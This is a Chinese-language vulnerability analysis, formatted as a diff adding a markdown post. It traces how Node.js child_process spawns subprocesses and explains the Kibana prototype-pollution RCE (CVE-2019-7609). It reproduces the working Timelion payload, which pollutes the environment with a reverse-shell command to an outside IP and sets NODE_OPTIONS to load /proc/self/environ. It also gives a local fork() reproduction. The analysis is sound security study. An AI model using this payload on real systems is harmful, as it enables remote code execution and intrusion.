@@ -1,0 +1,147 @@
+# 从Kibana-RCE对nodejs子进程创建的思考
+在前几天Kibana有一则关于原型链污染+子进程调用=>rce的漏洞，跟进分析的时候发现child_process实现子进程创建确实存在trick。于是有了下文是对child_process的实现和Kibana
+RCE的一点思考。
+# child_process建立子进程的实现
+对于child_process大家应该都不陌生，它是nodejs内置模块，用于新建子进程，在CTF题目中也常使用`require('child_process').exec('xxx')`来RCE。
+child_process内置了6个方法:execFileSync、execSync、fork、exec、execFile、spawn()
+其中execFileSync()调用spawnSync()，execSync()调用spawnSync()，而spawnSync()调用spawn();exec()调用execFile()，最后execFile()调用spawn();fork()调用spawn()。也就是说前6个方法最终都是调用spawn()，其中spawn()的本质是创建ChildProcess的实例并返回。那我们直接对spawn这个方法进行分析
+测试代码:
+    const { spawn } = require('child_process');
+    spawn('whoami').stdout.on('data', (data) => {
+        console.log(`stdout: ${data}`);
+      });
+Node使用模块`child_process`建立子进程时，调用`用户层面的spawn`方法。初始化子进程的参数，步入`normalizeSpawnArguments`
+    var spawn = exports.spawn = function(/*file, args, options*/) {
+      var opts = normalizeSpawnArguments.apply(null, arguments);
+    };
+跟进`normalizeSpawnArguments`，当options不存在时将其命为空对象。接着到下面最关键的一步，即获取env变量的方式。首先对options.env是否存在做了判断，如果options.env为undefined则将环境变量`process.env`的值复制给env。而后对envParivs这个数组进行push操作，其实就是env变量对应的键值对。
+    function normalizeSpawnArguments(file, args, options) {
+        ...//省略
+      if (options === undefined)
+        options = {};
+        ...//省略
+      var env = options.env || process.env;
+      var envPairs = [];
+      for (var key in env) {
+        envPairs.push(key + '=' + env[key]);
+      }
+      _convertCustomFds(options);
+      return {
+        file: file,
+        args: args,
+        options: options,
+        envPairs: envPairs
+      };
+    }
+这里就存在一个问题，options默认为空对象，那么它的 **任何属性**
+都存在被污染的可能。只要能污染到`Object.prototype`，那么options就可以添加我们想要的任何属性，包括`options.env`。经过`normalizeSpawnArguments`封装并返回后，建立新的子进程`new
+ChildProcess()`，这里才算进入内部child_process的实现。
+    var opts = normalizeSpawnArguments.apply(null, arguments);
+    var options = opts.options;
+    var child = new ChildProcess();
+    child.spawn({
+    file: opts.file,
+    args: opts.args,
+    cwd: options.cwd,
+    windowsVerbatimArguments: !!options.windowsVerbatimArguments,
+    detached: !!options.detached,
+    envPairs: opts.envPairs,
+    stdio: options.stdio,
+    uid: options.uid,
+    gid: options.gid
+    });
+这里我们直接看`ChildProcess.spawn`如何实现，也就是原生的spawn。核心代码逻辑是下面的两句，具体代码在`process_wrap.cc`
+    ChildProcess.prototype.spawn = function(options) {
+      //...
+      var err = this._handle.spawn(options);
+      //...
+      // Add .send() method and start listening for IPC data
+      if (ipc !== undefined) setupChannel(this, ipc);
+      return err;
+    };
+`this._handle.spawn`调用了`process_wrap.cc`的spawn来生成子进程，是node子进程创建的底层实现，那我们看一下`process_wrap.cc`中对options的值进行了怎样的操作，。
+    static void Spawn(const FunctionCallbackInfo& args) {
+        //获取js传过来的第一个option参数
+        Local js_options = args[0]->ToObject(env->context()).ToLocalChecked();
+        ...
+        // options.env
+        Local env_v =
+            js_options->Get(context, env->env_pairs_string()).ToLocalChecked();
+        if (!env_v.IsEmpty() && env_v->IsArray()) {
+          Local env_opt = Local::Cast(env_v);
+          int envc = env_opt->Length();
+          CHECK_GT(envc + 1, 0);  // Check for overflow.
+          options.env = new char*[envc + 1];  // Heap allocated to detect errors.
+          for (int i = 0; i isolate(),
+                                 env_opt->Get(context, i).ToLocalChecked());
+            options.env[i] = strdup(*pair);
+            CHECK_NOT_NULL(options.env[i]);
+          }
+          options.env[envc] = nullptr;
+        }
+        ...
+        //调用uv_spawn生成子进程，并将父进程的event_loop传递过去
+        int err = uv_spawn(env->event_loop(), &wrap->process_, &options);
+        //省略
+      }
+代码只截取了对env这个属性的操作，它将原先的envPairs进行封装。最后所有options带入`uv_spawn`来生成子进程，在`uv_spawn`中就是常规的fork()、waitpid()来控制进程的产生和资源释放，不过有一个非常重要的实现如下:
+    //process.cc->uv_spawn()
+    execvp(options->file, options->args);
+execvp来执行任务，这里的options->file就是我们最初传给spawn的参数。比如我们的例子是`spawn('whoami')`，那么此时的file就是`whoami`，当然对于有参数的命令，则options->args与之对应。
+## 总结流程
+child_process创建子进程的流程看起来有些复杂，总结一下:
+1、初始化子进程需要的参数，设置环境变量  
+2、fork()创建子进程，并用`execvp`执行系统命令。  
+3、ipc通信，输出捕捉
+# Kibana-RCE
+## 漏洞分析
+首先引用漏洞原作者的举例  
+node的官方文档中也能找到相同的用例:
+node版本>v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。  
+在node进程启动的时候作为环境变量加载，通过打印process.env也能证明
+    hpdoger@ChocoMacBook-Pro$ NODE_OPTIONS='--require ./evil.js' node
+    success!!!
+    > process.env.NODE_OPTIONS
+    '--require ./evil.js'
+如果我们能改变本地环境变量，则在node创建进程的时候就可以包含恶意语句。尝试用export来实现如下。  
+事实证明，只要产生新进程就会加载一次本地环境变量，存储形式为process.env，若env中存在NODE_OPTIONS则进行相应的加载。但是这种需要bash漏洞就是耍流氓，于是作者想到了一种方法来污染process.env，也就是上文分析的env的获取，于是有了Kibana的poc
+    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
+    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
+node运行时会把当前进程的env写进系统的环境变量，子进程也一样，在linux中存储为`/proc/self/environ`。通过污染env把恶意的语句写进/proc/self/environ。同时污染`process.NODE_OPTIONS`属性，使node在生成新进程的时候，包含我们构造的`/proc/self/environ`。具体操作就类似下面的用法  
+污染了Object.env之后，利用Canvas生成新进程的时候会执行spawn从而RCE
+## 利用条件
+最开始我并没有跟进Kibana的源码，只是把漏洞归结于:
+    污染Object.env+创建子进程 => RCE
+于是我做了下面的测试，发现并没有像我想象中的输出evil.js中的内容，但是NODE_OPTIONS确实被写进了子进程的env。  
+当我将进程建立换为`proc.fork()`时，则成功加载了evil.js并输出  
+child_process.fork() 方法是 child_process.spawn() 的一个特例，专门用于衍生新的 Node.js 进程。 与
+child_process.spawn() 一样返回 ChildProcess
+对象。所以fork调用的是spawn来实现的子进程创建，那怎么会有这种情况？跟进一下fork看看实现有什么不同
+    exports.fork = function(modulePath /*, args, options*/) {
+        ...//省略
+        options.execPath = options.execPath || process.execPath;
+        return spawn(options.execPath, args, options);
+    }
+它处理了execPath这个属性，默认获取系统变量的process.execPath，再传入spawn，这里就是`node`。  
+而我们用spawn时，处理得到的file为`whoami`  
+上文分析child_process在子进程创建的最底层，会调用execvp执行命令执行file
+    execvp(options->file, options->args);
+而上面poc核心就是`NODE_OPTIONS='--require /proc/self/environ'
+node`，即bash调用了node去执行。所以此处的file值必须为node，否则无法将NODE_OPTIONS载入。而直接调用spawn函数时必须有file值，这也造成了第一种代码无法加载evil.js的情况  
+经过测试exec、execFile函数无论传入什么命令，file的值都会为`/bin/sh`，因为参数shell默认为true。即使不传入options选项，这两个命令也会默认定义options，这也是child_process防止命令执行的一种途径。  
+但是shell这个变量也是可以被污染的，不过child_process在这里做了限制，即使shell===false或字符串。最终传到execvp时也会被执行的参数替代，而不是真正的node进程。
+这样看来在污染了原型的条件下，child_process只有进行了fork()的时候，才能达到漏洞的利用。不过这样的利用面确实太窄了，如果有师傅研究过其他函数的执行spawn时能启动node进程，可以交流一下思路
+所以回到fork()函数，我们可以验证包含/proc/self/environ是可行的
+    // test.js
+    proc = require('child_process');
+    var aa = {}
+    aa.__proto__.env = {'AAAA':'console.log(123)//','NODE_OPTIONS':'--require /proc/self/environ'}
+    proc.fork('./function.js');
+    //function.js
+    console.log('this is func')
+同时可以看到，fork在指定了modulepath的情况下，包含environ的同时并不影响modulepath中代码的执行。
+# 相关链接
+[Exploiting prototype pollution – RCE in Kibana
+(CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)  
+[spawn、exec、execFile和fork](http://cnode1.rssing.com/chan-68517434/all_p385.html)  
+[Kibana漏洞之javascript原型链污染](https://mp.weixin.qq.com/s?__biz=MzA4NzA5OTYzNw==&mid=2247483761&idx=1&sn=a366c51bd57b4fead862d11616a10b19&chksm=903fd0eba74859fd6ba296e29bf600a1004eeed72de3fb433c74d47654ce37a435e6d1e2742c&mpshare=1&scene=1&srcid=&sharer_sharetime=1571588210071&sharer_shareid=3674d5df50965fb924ba35f64042cb57&key=a2eb8c0b2340b20d3581c0a15949a693ac0879f7879b201f3878bc1f796bf6e8225380e8c186fbea7a3f5abb3c67841d7f71500c9619d916c3ced85f20b5d9cefdb3980e259d7e0c59132aada59c4132&ascene=1&uin=MTMyNzEzMTk2NQ%3D%3D&devicetype=Windows+10&version=62070152&lang=zh_CN&pass_ticket=866ICVsXH4EG%2FSMhWF45HLNA4E5jKkn%2Fh4V6bsGMzepRRdEW4YsHhfvV84kkAfIA)
